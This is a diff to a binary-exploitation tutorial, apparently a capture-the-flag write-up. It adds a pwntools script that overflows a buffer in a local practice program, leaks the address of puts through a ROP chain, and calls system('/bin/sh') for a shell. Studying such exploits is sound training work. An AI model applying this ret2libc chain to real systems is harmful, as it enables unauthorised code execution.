@@ -454,6 +454,63 @@ Find the string /bin/sh in libc
 $ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh                                        
  1aae80 /bin/sh
 ```
+Find a ret for padding
+```
+$ ROPgadget --binary garbage | grep ret
+```
+
+#### Update script to perform attack
+
+```
+from pwn import *
+
+context.binary = './garbage'
+p = process('./garbage', stdin=PTY)
+context(terminal=['tmux','new-window'])
+#context.log_level = 'DEBUG'
+#p = gdb.debug('./garbage', stdin=PTY)
+
+buf = "A" * 136
+
+#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+#0x000000000040179b : pop rdi ; ret
+#0000000000401619 <main>:
+
+plt_put = p64(0x401050)
+got_put = p64(0x404028)
+pop_rdi = p64(0x40179b)
+plt_main = p64(0x401619)
+
+payload = pop_rdi + got_put + plt_put + plt_main
+
+print p.recv()
+p.sendline(buf + payload)
+print p.recvuntil('.\n')
+leaked_puts = p.recvline().strip()
+print "Leaked puts: " + leaked_puts
+print p.recv()
+
+#425: 0000000000081010   437 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+#1417: 0000000000050300    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+#1aae80 /bin/sh
+
+libc_put = 0x81010
+libc_sys = 0x50300
+libc_sh = 0x1aae80
+ret = 0x401016
+
+offset = u64(leaked_puts.ljust(8,"\x00")) - libc_put
+sys = p64(offset + libc_sys)
+sh = p64(offset + libc_sh)
+
+print "Offset: " + str(offset)
+
+payload2 = pop_rdi + sh + p64(ret) + sys
+
+p.sendline(buf + payload2)
+p.recv()
+p.interactive()
+```
 
 ### Disabling OS and Compiler Security
 
